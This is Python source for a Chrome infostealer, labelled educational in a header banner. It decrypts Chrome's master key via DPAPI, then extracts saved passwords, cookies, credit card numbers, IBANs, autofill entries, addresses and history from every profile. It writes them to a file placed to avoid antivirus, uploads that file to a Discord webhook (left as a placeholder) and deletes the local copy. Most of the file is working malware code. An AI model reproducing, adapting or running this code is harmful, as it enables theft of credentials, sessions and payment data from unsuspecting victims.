###################################################################################################################
# This code is for educational purposes. It will allow you to understand the principle of infostealer automation. #
# This code is intentionally minimalist to avoid any resumption for malicious purposes.                           #
# Antivirus evasion methods are deliberately kept to the bare minimum.                                            #
###################################################################################################################

import os, sqlite3, time, threading, sys, requests, psutil, re

from Crypto.Cipher import AES
from base64 import b64decode
from sqlite3 import connect as sql_connect
from ctypes import windll, wintypes, byref, cdll, Structure, POINTER, c_char, c_buffer
from json import loads as json_loads, load


######################## Set variables ########################
global CookiCount, PasswCount

CookiCount, PasswCount = 0, 0

# If you use the temp folder the antivirus will detect the program's behavior as suspicious
doc_path = os.path.join(os.path.expanduser("~"), "Documents") 
file_target = os.path.join(doc_path, "results.txt")


# Set main target path
def get_chrome_main_path():
       # Get username victim
        username = os.getlogin()

        # Get full main access path of Chrome (by default it's always on the 'C' drive)
        chrome_main_path = os.path.join('C:\\', 'Users', username, 'AppData', 'Local', 'Google', 'Chrome', 'User Data')

        return chrome_main_path



# Creating a local storage file
def init_text():
    try:
        with open(file_target, 'w') as file:
            file.write("=============== Chrome info's stealer ===============\n\n\n#################### Default User ####################\n\n")
    except:
        exit() # Program won't work without that storage file



# Remove text file storage
def killit():
    try:
        os.remove(file_target)
    except:
        pass

# Kill the Chrome process to extract the cookie tables. If the Chrome profile is running, you will not extract the data.
def kill_chrome():
    for process in psutil.process_iter():
        try:
            if process.name() == "chrome.exe":
                process.terminate()
        except psutil.NoSuchProcess:
            pass


######################## Decrypt stuff ########################
class DATA_BLOB_BROWSER(Structure):
    _fields_ = [
        ('cbData', wintypes.DWORD),
        ('pbData', POINTER(c_char))
    ]

def DecryptValue(buff, master_key=None):
    starts = buff.decode(encoding='utf8', errors='ignore')[:3]
    if starts == 'v10' or starts == 'v11':
        iv = buff[3:15]
        payload = buff[15:]
        cipher = AES.new(master_key, AES.MODE_GCM, iv)
        decrypted_pass = cipher.decrypt(payload)
        decrypted_pass = decrypted_pass[:-16].decode()
        return decrypted_pass

def GetData(blob_out):
    cbData = int(blob_out.cbData)
    pbData = blob_out.pbData
    buffer = c_buffer(cbData)
    cdll.msvcrt.memcpy(buffer, pbData, cbData)
    windll.kernel32.LocalFree(pbData)
    return buffer.raw

def CryptUnprotectData(encrypted_bytes, entropy=b''):
    buffer_in = c_buffer(encrypted_bytes, len(encrypted_bytes))
    buffer_entropy = c_buffer(entropy, len(entropy))
    blob_in = DATA_BLOB_BROWSER(len(encrypted_bytes), buffer_in)
    blob_entropy = DATA_BLOB_BROWSER(len(entropy), buffer_entropy)
    blob_out = DATA_BLOB_BROWSER()

    if windll.crypt32.CryptUnprotectData(byref(blob_in), None, byref(blob_entropy), None, None, 0x01, byref(blob_out)):
        return GetData(blob_out)


#########################################################
# ====================== STEALER ====================== #
#########################################################
def extract_history(targetX):
    try:
        if not os.path.exists(targetX): return
        if os.stat(targetX).st_size == 0: return

        DB_PATH = targetX
        def extract_urls_table():
            db = sqlite3.connect(DB_PATH)
            cursor = db.cursor()
            query = "SELECT * FROM urls"
            cursor.execute(query)
            donnees = cursor.fetchall()
            db.close()
            return donnees

        donnees = extract_urls_table()

        if donnees:
            with open(file_target, "a", encoding="utf-8") as f:
                f.write("\n\n========== History ==========\n")
                for datX in donnees:
                    id = datX[0]
                    url = datX[1]
                    title = datX[2]
                    visit_count = datX[3]
                    typed_count = datX[4]
                    last_visit_time = datX[5]
                    hidden = datX[6]

                    last_visit_time_str = ""
                    if last_visit_time != 0:
                        last_visit_time_str = str(last_visit_time)

                    f.write(f"URL : {url}\nTitle : {title}\nVisits : {visit_count} \n\n")
    except:
        pass


def extract_credit_cards(targetX, KeyX):
    try:
        if not os.path.exists(targetX): return
        if os.stat(targetX).st_size == 0: return

        connexion = sqlite3.connect(targetX)
        curseur = connexion.cursor()
        requete_sql = "SELECT card_number_encrypted, name_on_card, expiration_month, expiration_year FROM credit_cards"
        curseur.execute(requete_sql)
        donnees = curseur.fetchall()
        connexion.close()

        with open(KeyX, 'r', encoding='utf-8') as f: local_state = json_loads(f.read())
        master_key = b64decode(local_state['os_crypt']['encrypted_key'])
        master_key = CryptUnprotectData(master_key[5:])

        if donnees:
            with open(file_target, 'a', encoding='utf-8') as fichier:
                fichier.write("\n\n========== Extracted Credit Cards ==========\n")
                for datX in donnees:
                    fichier.write(f"Card Number: {DecryptValue(datX[0], master_key)}\n")
                    fichier.write(f"Name Owner: {datX[1]}\n")
                    fichier.write(f"Expiration month: {datX[2]}\n")
                    fichier.write(f"Expiration year: {datX[3]}\n")
                    fichier.write("-------------------------\n")
    except:
        pass


def extract_IBAN(targetX, KeyX):
    try:
        if not os.path.exists(targetX): return
        if os.stat(targetX).st_size == 0: return

        connexion = sqlite3.connect(targetX)
        curseur = connexion.cursor()
        requete_sql = "SELECT value_encrypted, nickname FROM local_ibans"
        curseur.execute(requete_sql)
        donnees = curseur.fetchall()
        connexion.close()

        with open(KeyX, 'r', encoding='utf-8') as f: local_state = json_loads(f.read())
        master_key = b64decode(local_state['os_crypt']['encrypted_key'])
        master_key = CryptUnprotectData(master_key[5:])

        if donnees:
            with open(file_target, 'a', encoding='utf-8') as fichier:
                fichier.write("\n\n========== IBAN ==========\n")
                for datX in donnees:
                    fichier.write(f"IBAN: {DecryptValue(datX[0], master_key)}\n")
                    fichier.write(f"Nickname: {datX[1]}\n")
                    fichier.write("-------------------------\n")
    except:
        pass


def extract_autofill(targetX):
    try:
        if not os.path.exists(targetX): return
        if os.stat(targetX).st_size == 0: return

        connexion = sqlite3.connect(targetX)
        curseur = connexion.cursor()
        requete_sql = "SELECT name, value FROM autofill"
        curseur.execute(requete_sql)
        donnees = curseur.fetchall()
        connexion.close()

        if donnees:
            with open(file_target, 'a', encoding='utf-8') as fichier:
                fichier.write("\n\n========== Autofill ==========\n")
                for datX in donnees:
                    fichier.write(f"Name: {datX[0]}\n")
                    fichier.write(f"Value: {datX[1]}\n")
                    fichier.write("-------------------------\n")
    except:
        pass


Passw = []
def extract_passwords(targetX, KeyX):
    try:
        global Passw, PasswCount
        if not os.path.exists(targetX):
            return
        if os.stat(targetX).st_size == 0:
            return
    
        connex = sqlite3.connect(targetX)
        cursor = connex.cursor()
        cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
        donnees = cursor.fetchall()
        cursor.close()
        connex.close()

        with open(KeyX, 'rb') as f: 
            local_state = json_loads(f.read().decode('utf-8', 'ignore'))  
        master_key = b64decode(local_state['os_crypt']['encrypted_key'])
        master_key = CryptUnprotectData(master_key[5:])

        for datX in donnees: 
            if datX[0] != '':
                password_decoded = DecryptValue(datX[2], master_key)
                if password_decoded:  
                    Passw.append(f"\n------------------------------\nURL:  {datX[0]} \nUSER:  {datX[1]} \nPASS:  {password_decoded}\n------------------------------\n")
                    PasswCount += 1
        if donnees:
            with open(file_target, 'a', encoding='utf-8') as fichier:
                fichier.write("\n\n========== Passwords ==========\n")
                for line in Passw:
                    if line[0] != '':
                        fichier.write(f"{line}\n")
    except:
        pass


Cookies = []
def extract_cookies(targetX, KeyX):
    try:
        global Cookies, CookiCount
        if not os.path.exists(targetX): return
        if os.stat(targetX).st_size == 0: return
    
        connex = sql_connect(targetX)
        cursor = connex.cursor()
        cursor.execute("SELECT host_key, name, encrypted_value FROM cookies")
        donnees = cursor.fetchall()
        cursor.close()
        connex.close()
    
        with open(KeyX, 'r', encoding='utf-8') as f: local_state = json_loads(f.read())
        master_key = b64decode(local_state['os_crypt']['encrypted_key'])
        master_key = CryptUnprotectData(master_key[5:])

        for datX in donnees: 
            if datX[0] != '':
                Cookies.append(f"\n------------------------------\nHost Key :  {datX[0]} \nName :  {datX[1]} \nCrypted Value : {datX[2]} \nDecrypted Value :  {DecryptValue(datX[2], master_key)}\n------------------------------\n")
                CookiCount += 1
        
        if donnees:
            with open(file_target, 'a', encoding='utf-8') as fichier:
                fichier.write("\n\n========== Cookies ==========\n")
                for line in Cookies:
                    if line[0] != '':
                        fichier.write(f"{line}\n")
    except:
        pass
   

def extract_personnal_infos(targetX):
    try:
        if not os.path.exists(targetX): return
        if os.stat(targetX).st_size == 0: return
        connexion = sqlite3.connect(targetX)
        curseur = connexion.cursor()
        requete_sql = "SELECT value FROM local_addresses_type_tokens"
        curseur.execute(requete_sql)
        donnees = curseur.fetchall()
        connexion.close()

        if donnees:
            with open(file_target, 'a', encoding='utf-8') as fichier:
                unique_addresses = set()
                fichier.write("\n\n========== Personnal user info's ==========\n")
                for datX in donnees:
                    adresse = datX[0].strip()  
                    if adresse and adresse not in unique_addresses:
                        fichier.write(f"{adresse}\n")
                        unique_addresses.add(adresse)
    except:
        pass

#########################################################
# ======================= SEND ======================== #
#########################################################
def sendit():

    # Webhook Discord
    url_webhook = "DISCORD_WEBHOOK_HERE"

    payload = {
        "content": "Stealer Chrome",
        "username": "Basic stealer"
    }
    fichier = {'file': open(file_target, 'rb')}

    response = requests.post(url_webhook, files=fichier, data=payload)


#########################################################
# ======================= INIT ======================== #
#########################################################
def main():

    try:
        main_target_path = get_chrome_main_path()
        default_path = os.path.join(main_target_path, "Default")

        if os.path.exists(default_path):
            init_text() # Init text file to drop collected infos
            local_state_target = os.path.join(main_target_path, "Local State")
            
            kill_chrome()

            # Set targets
            web_data_target = os.path.join(default_path, "Web Data") 
            login_data_target = os.path.join(default_path, "Login Data") 
            history_target = os.path.join(default_path, "History") 
            cookies_target = os.path.join(default_path, "Network", "Cookies") 

            # Init stealer
            extract_passwords(login_data_target, local_state_target)
            extract_autofill(web_data_target)
            extract_personnal_infos(web_data_target)
            extract_credit_cards(web_data_target, local_state_target)
            extract_IBAN(web_data_target, local_state_target)
            extract_cookies(cookies_target, local_state_target)
            extract_history(history_target)

            try:
                for item in os.listdir(main_target_path):
                    if re.match(r"^Profile\s+\d+$", item): # List all profiles as 'Profile 1', 'Profile 2', etc ...
                        
                        # Set targets
                        web_data_target = os.path.join(main_target_path, item, "Web Data") 
                        login_data_target = os.path.join(main_target_path, item, "Login Data") 
                        history_target = os.path.join(main_target_path, item, "History") 
                        cookies_target = os.path.join(main_target_path, item, "Network", "Cookies") 
                        
                        # Set new target profile detected on the results.txt
                        with open(file_target, 'a', encoding='utf-8') as fichier:
                            fichier.write(f"\n\n#################### {item} ####################\n\n")


                        # Init stealer
                        extract_passwords(login_data_target , local_state_target)
                        extract_autofill(web_data_target)
                        extract_personnal_infos(web_data_target)
                        extract_credit_cards(web_data_target , local_state_target)
                        extract_IBAN(web_data_target , local_state_target)
                        extract_cookies(cookies_target , local_state_target)
                        extract_history(history_target)
            except:
                pass  

        sendit() 
        killit() 
    except:
        pass      


if __name__ == "__main__":
    main()
